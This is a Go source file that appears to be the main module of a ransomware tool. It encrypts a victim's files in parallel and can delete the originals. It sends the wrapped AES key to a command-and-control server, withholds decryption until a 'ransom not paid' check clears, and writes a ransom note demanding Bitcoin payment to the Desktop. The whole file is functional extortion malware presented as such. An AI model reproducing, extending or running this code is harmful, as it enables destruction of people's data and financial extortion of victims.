package main

import (
	"crypto/rand"
	"crypto/sha1"
	"encoding/hex"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"main/src/cli"
	wcc "main/src/crypto"
	"main/src/utils"
	. "main/src/utils"
	"os"
	"path/filepath"
	"sync"
)

func StartEncryption(q *Queue, key string) int {
	var keySendOffSuccessful bool
	pubKeyBytes, _ := hex.DecodeString(key)
	AESKeyBytes, encryptedAESKey, err := handleEncryptionKeys(pubKeyBytes, &keySendOffSuccessful)

	wg := new(sync.WaitGroup)
	for {
		file := q.Pop()
		if len(file) == 0 {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			wcc.EncryptFile(file, "", AESKeyBytes)
			if cli.Settings.Delete {
				os.Remove(file)
			}
		}()
	}
	wg.Wait()
	if !keySendOffSuccessful || err != nil {
		ioutil.WriteFile("e_key.txt", []byte(encryptedAESKey), 0777)
	}
	if cli.Settings.LeaveNote {
		leaveRansomNote(key)
	}
	return 0
}

func StartDecryption(q *Queue, key string) int {
	var keyBytes []byte
	if cli.Settings.RawKey {
		rKeyBytes, fe := ioutil.ReadFile("./raw_key.bin")
		if fe != nil {
			log.Fatal(fe.Error())
		}
		keyBytes = rKeyBytes
	} else {
		var hash []byte
		var err error
		if len(cli.Settings.DecryptionHash) > 0 {
			hash = []byte(cli.Settings.DecryptionHash)
		} else {
			hash, err = ioutil.ReadFile("./decryption_hash.bin")
			if err != nil {
				log.Fatal("Failed to read the hash for key retrival")
			}
		}
		keyHex, err := RetriveKeyByHash(string(hash), cli.Settings.OfflineMode)
		if err != nil {
			if err.Error() == "ransom not paid" {
				fmt.Println("The ransom is currently not paid. If you made the payment there could be some processing delays so patience is adviced")
				log.Fatal("Ransom not paid")
			} else if err.Error() == "failed to contact CnC server" {
				fmt.Println("Failed to contact the server. Running in offline mode")
				keyHexBytes, err := ioutil.ReadFile("./d_key.txt")
				if err != nil {
					fmt.Println("Failed to contact the server. No local 'd_key.bin key found'. Decryption not possible")
					log.Fatal("Failed to preform offline decryption: missing decrypted AES file")
				}
				keyHex = string(keyHexBytes)
			} else {
				log.Fatal("Unexpected error occurred in key retrieval process")
			}
		}
		keyBytes, _ = hex.DecodeString(keyHex)
	}
	wg := new(sync.WaitGroup)
	for {
		file := q.Pop()
		if len(file) == 0 {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			wcc.DecryptFile(file, keyBytes)
			if cli.Settings.Delete {
				os.Remove(file)
			}
		}()
	}
	wg.Wait()
	return 0
}

func handleEncryptionKeys(pubKeyBytes []byte, flag *bool) ([]byte, string, error) {
	var keyBytes []byte
	if len(cli.Settings.SuppliedAESKey) == 0 {
		keyBytes = make([]byte, 32)
		rand.Read(keyBytes)
	} else {
		keyBytes, _ = hex.DecodeString(cli.Settings.SuppliedAESKey)
	}

	encryptedAESKey, err := wcc.EncryptWithRSAPublicKey(keyBytes, string(pubKeyBytes))

	if cli.Settings.RawKey {
		ioutil.WriteFile("./raw_key.bin", keyBytes, 0777)
	} else {
		var resp bool
		resp, err = utils.SendOffKey(encryptedAESKey, wcc.GetHash(keyBytes), cli.Settings.PaidStatus, cli.Settings.OfflineMode)
		ioutil.WriteFile("./decryption_hash.bin", []byte(wcc.GetHash(keyBytes)), 0777)
		if err != nil || !resp {
			log.Println("Failed to contact Command And Control server")
			err = errors.New("failed to contact CnC server")
			*flag = false
		} else {
			*flag = true
		}
	}
	return keyBytes, encryptedAESKey, err
}

func leaveRansomNote(key string) {
	var note = `
		You are a victim of ransomware hacker attack!
		Your files have been encrypted by a strong security algorithm. They are NOT comming back. No amount of googling will help you.
		There is only one way to return your files: obtain the key. Only way to get he key is to pay the ransom.
		Pay the ransom to the following Bitcoin address: 178Dg2rMxVF9Ux8TpZbad3SoWoga6qb3N9
		Ransom amount is 500$.
		Send email with TXID (tansaction ID) in the title and HASH in body to nonna@mail2tor.com
		If you've done everything correctly you will receve key and instructions on how to recover the files.
		You don't have much time.
		Hash is: `

	sha := sha1.New()
	sha.Write([]byte(key))
	keyHash := sha.Sum(nil)
	signedNote := note + hex.EncodeToString(keyHash)

	fileName := "READ_ME_NOW.txt"
	filePath := filepath.Join(GetDesktopLocation(), fileName)
	_, err := os.OpenFile(filePath, os.O_CREATE, os.ModeAppend)
	if err != nil {
		filePath = "C:\\" + fileName
	}
	err = ioutil.WriteFile(filePath, []byte(signedNote), 0777)
	if err != nil {
		filePath = fileName
		ioutil.WriteFile(filePath, []byte(signedNote), 0777)
	}
}
